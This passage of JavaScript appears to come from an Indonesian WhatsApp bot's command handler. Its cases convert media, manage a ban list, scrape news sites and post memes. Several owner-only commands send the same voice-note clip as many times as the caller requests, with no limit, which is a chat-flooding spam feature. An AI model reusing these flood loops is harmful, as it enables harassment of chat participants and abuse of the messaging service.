jansen.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : doc })
}
break
//=================================================//
case 'jadibug2': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./basejansen/lib/converter')
let audio = await toAudio(media, 'mp4')
jansen.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${jansen.user.name}.mp3`}, { quoted : doc})
}
break
//=================================================//
case 'jadibug3': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./basejansen/lib/converter')
let audio = await toPTT(media, 'mp4')
jansen.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:doc})
}
break
//=================================================//
case 'jadibug4': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await jansen.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
jansen.sendMessage(m.chat, { image: buffer }, { quoted: doc })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'jadibug5': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await jansen.downloadAndSaveMediaMessage(quoted)
jansen.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: doc })
} else if (/video/.test(mime)) {
anu = await jansen.downloadAndSaveMediaMessage(quoted)
jansen.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
}
}
break
//=================================================//
case 'jansenhu': case 'jansens1': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 mem = fs.readFileSync('./basejansen/sound/tes.mp3')
 jansen.sendMessage(m.chat, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'jansenhi': case 'jansens2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 mom = fs.readFileSync('./basejansen/sound/ketawa.mp3')
 jansen.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'jansenha': case 'jansens3': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 mim = fs.readFileSync('./basejansen/sound/ketawa.mp3')
 jansen.sendMessage(m.chat, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'jansenhe': case 'jansens4': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 mum = fs.readFileSync('./basejansen/sound/awkwk.mp3')
 jansen.sendMessage(m.chat, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'jansenba': case 'jansens5': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 ah = fs.readFileSync('./basejansen/sound/bang.mp3')
 jansen.sendMessage(m.chat, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'jansenbe': case 'jansens6': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 eh = fs.readFileSync('./basejansen/sound/nob.mp3')
 jansen.sendMessage(m.chat, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'jansenbu': case 'jansens7': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 ih = fs.readFileSync('./basejansen/sound/ikehcok.mp3')
 jansen.sendMessage(m.chat, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'jansenbi': case 'jansens8': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 nyong = fs.readFileSync('./basejansen/sound/mastah.mp3')
 jansen.sendMessage(m.chat, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'jansenca': case 'jansens9': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 ri = fs.readFileSync('./basejansen/sound/ikehcok.mp3')
 jansen.sendMessage(m.chat, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'jansenci': case 'jansens10': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 ru = fs.readFileSync('./basejansen/sound/loli.mp3')
 jansen.sendMessage(m.chat, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'jansencu': case 'jansens11': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 re = fs.readFileSync('./basejansen/sound/kesel.mp3')
 jansen.sendMessage(m.chat, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'jansenco': case 'sleme12': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 ro = fs.readFileSync('./basejansen/sound/ngeselin.mp3')
 jansen.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
 case 'jansendj1': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 tagq = fs.readFileSync('./basejansen/sound/so1.mp3')
 jansen.sendMessage(m.chat, {audio: tagq, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
case 'jansendj2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 tagw = fs.readFileSync('./basejansen/sound/so2.mp3')
 jansen.sendMessage(m.chat, {audio: tagw, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
case 'jansendj3': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 tage = fs.readFileSync('./basejansen/sound/so3.mp3')
 jansen.sendMessage(m.chat, {audio: tage, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
case 'jansendj4': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 tagr = fs.readFileSync('./basejansen/sound/so4.mp3')
 jansen.sendMessage(m.chat, {audio: tagr, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
case 'jansendj5': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 tagt = fs.readFileSync('./basejansen/sound/so5.mp3')
 jansen.sendMessage(m.chat, {audio: tagt, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
case 'jansendj6': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 tagy = fs.readFileSync('./basejansen/sound/so6.mp3')
 jansen.sendMessage(m.chat, {audio: tagy, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
case 'jansendj7': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 tagu = fs.readFileSync('./basejansen/sound/so7.mp3')
 jansen.sendMessage(m.chat, {audio: tagu, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
case 'jansendj8': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 tagi = fs.readFileSync('./basejansen/sound/so8.mp3')
 jansen.sendMessage(m.chat, {audio: tagi, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
case 'jansendj9': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 tago = fs.readFileSync('./basejansen/sound/so9.mp3')
 jansen.sendMessage(m.chat, {audio: tago, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
case 'jansendj10': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 tagp = fs.readFileSync('./basejansen/sound/so10.mp3')
 jansen.sendMessage(m.chat, {audio: tagp, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
case 'jansendj11': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 taga = fs.readFileSync('./basejansen/sound/so11.mp3')
 jansen.sendMessage(m.chat, {audio: taga, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'jansendj12': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 tagd = fs.readFileSync('./basejansen/sound/so12.mp3')
 jansen.sendMessage(m.chat, {audio: tagd, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
 case 'jansendj13': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 tagf = fs.readFileSync('./basejansen/sound/so13.mp3')
 jansen.sendMessage(m.chat, {audio: tagf, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
 case 'jansendj14': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 tagg = fs.readFileSync('./basejansen/sound/so14.mp3')
 jansen.sendMessage(m.chat, {audio: tagg, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
 case 'jansendj15': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 tagh = fs.readFileSync('./basejansen/sound/so15.mp3')
 jansen.sendMessage(m.chat, {audio: tagh, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
 case 'jansendj16': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 zzz = fs.readFileSync('./basejansen/sound/kecapi.mp3')
 jansen.sendMessage(m.chat, {audio: zzz, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
 case 'jansendj17': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 zze = fs.readFileSync('./basejansen/sound/kuelapis.mp3')
 jansen.sendMessage(m.chat, {audio: zze, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
 //=================================================//
case 'ban': case 'banned': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!args[0]) return m.reply(`*Enter Option Select add or delete*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return m.reply('*User has been banned*')
banned.push(orgnye)
reply(`Succes ban`)
} else if (args[0] === "del") {
if (!isBane) return m.reply('*ban lifted you happy*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
reply(`*Success Removing Banned Users*`)
} else {
reply("Error")
}
}
break
//=================================================//
case 'searchgroups':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Example: ${prefix}searchgroups hacker`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
reply(res)
});
break
//=================================================//
case 'Nana': case 'noxa': {
if (isBan) throw sticBanLu(from)
 hey = fs.readFileSync('./basejansen/sound/tes.mp3')
 jansen.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'ngakak': {
if (isBan) throw sticBanLu(from)
 hiy = fs.readFileSync('./basejansen/sound/ketawa.mp3')
 jansen.sendMessage(m.chat, {audio: hiy, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'ketawa': {
if (isBan) throw sticBanLu(from)
 hoy = fs.readFileSync('./basejansen/sound/ketawa.mp3')
 jansen.sendMessage(m.chat, {audio: hoy, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'awkwk': {
if (isBan) throw sticBanLu(from)
 huy = fs.readFileSync('./basejansen/sound/awkwk.mp3')
 jansen.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'bang': {
if (isBan) throw sticBanLu(from)
 mi = fs.readFileSync('./basejansen/sound/bang.mp3')
 jansen.sendMessage(m.chat, {audio: mi, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'nob': {
if (isBan) throw sticBanLu(from)
 miki = fs.readFileSync('./basejansen/sound/nob.mp3')
 jansen.sendMessage(m.chat, {audio: miki, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'musik': {
if (isBan) throw sticBanLu(from)
 mo = fs.readFileSync('./basejansen/sound/ikehcok.mp3')
 jansen.sendMessage(m.chat, {audio: mo, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'mastah': {
if (isBan) throw sticBanLu(from)
 mu = fs.readFileSync('./basejansen/sound/mastah.mp3')
 jansen.sendMessage(m.chat, {audio: mu, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'jansen': {
if (isBan) throw sticBanLu(from)
 me = fs.readFileSync('./basejansen/sound/ikehcok.mp3')
 jansen.sendMessage(m.chat, {audio: me, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'cantik': {
if (isBan) throw sticBanLu(from)
 muku = fs.readFileSync('./basejansen/sound/loli.mp3')
 jansen.sendMessage(m.chat, {audio: muku, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'kesel': {
if (isBan) throw sticBanLu(from)
 meke = fs.readFileSync('./basejansen/sound/kesel.mp3')
 jansen.sendMessage(m.chat, {audio: meke, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'ngeselin': {
if (isBan) throw sticBanLu(from)
 moko = fs.readFileSync('./basejansen/sound/ngeselin.mp3')
 jansen.sendMessage(m.chat, {audio: moko, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
//=================================================//
case 'once': case 'toonce': { 
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await jansen.downloadAndSaveMediaMessage(quoted)
jansen.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anu = await jansen.downloadAndSaveMediaMessage(quoted)
jansen.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: m })
}
}
break
//=================================================//
/*
case 'anime': {
if (isBan) throw sticBanLu(from) 
if (!text) return m.reply(`you are looking for what anime apa?\n\nEXAMPLE ${prefix}anime naruto`)
anu = await fetchJson(`https://api.jikan.moe/v4/anime?q=${text}`)
let sections = [] 
for (let i of anu.data) {
const list = {title: `${i.title}`,
rows: [
{
 title: `${i.title}`, 
 rowId: `${prefix}animee ${i.mal_id}`,
 description: `${i.synopsis}`
}, 
]
}
sections.push(list) 
}
const sendm =jansen.sendMessage(
 m.chat, 
 {
text: `*Search Results From* ${text}`,
footer: botname,
title: "*▊▊▊ANIME▊▊▊*",
buttonText: "CLICK HERE",
sections
 }, { quoted : m })
}
break*/
//=================================================//
case 'translate': case 'terjemahan': case 'tr': {
if (isBan) throw sticBanLu(from)
if (!args.join(" ")) return m.reply("Text?")
tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=en&kata=${args.join(" ")}`)
Infoo = tes.info
Detek = tes.translate
m.reply(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
}
break
//=================================================//
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (isBan) throw sticBanLu(from)
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
jansen.sendImage(m.chat, data.url, mess.success, m)
})
break
//=================================================//
case 'darkjoke':{
if (isBan) throw sticBanLu(from)
anu = await getBuffer(`https://api.xteam.xyz/asupan/darkjoke?APIKEY=apivproject`)
jansen.sendMessage(m.chat, { image: anu, caption: `Beliau ini....` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'meme':{
if (isBan) throw sticBanLu(from)
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme?APIKEY=apivproject`)
jansen.sendMessage(m.chat, { image: anu, caption: `Bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'meme2':{
if (isBan) throw sticBanLu(from)
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme2?APIKEY=apivproject`)
jansen.sendMessage(m.chat, { image: anu, caption: `bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'ss': case 'ssweb': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} Url`
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
buf = await getBuffer(anu.screenshot) 
jansen.sendMessage(m.chat, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted: m }).catch((err) => m.reply(jsonformat('*LINK NYA SLUR*')))
}
break
//=================================================//
case 'fajar-news':
if (isBan) throw sticBanLu(from)
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case "quotes":
if (isBan) throw sticBanLu(from)
var res = await Quotes()
teks += `\nAuthor: ${res.author}\n`
teks += `\nQuotes:\n`
teks += `${res.quotes}\n`
teks += ""
reply(teks)
break
//=================================================//
case "darkjoke": case "darkjokes":
if (isBan) throw sticBanLu(from)
var res = await Darkjokes()
teks = "*Darkjokes*"
jansen.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted: m })
break
//=================================================//
case 'cnn-news':
if (isBan) throw sticBanLu(from)
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'layarkaca-search':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
reply(teks) 
})
break
//=================================================//
case 'cnbc-news':
if (isBan) throw sticBanLu(from)
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
jansen.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'tribun-news':
if (isBan) throw sticBanLu(from)
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
jansen.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'indozone-news':
if (isBan) throw sticBanLu(from)
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
jansen.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'kompas-news':
if (isBan) throw sticBanLu(from)
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
jansen.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'detik-news':
if (isBan) throw sticBanLu(from)
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
jansen.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'daily-news':
if (isBan) throw sticBanLu(from)
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
jansen.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'inews-news':
if (isBan) throw sticBanLu(from)
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'okezone-news':
if (isBan) throw sticBanLu(from)
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
jansen.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case 'sindo-news':
if (isBan) throw sticBanLu(from)
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'tempo-news':
if (isBan) throw sticBanLu(from)
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
jansen.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
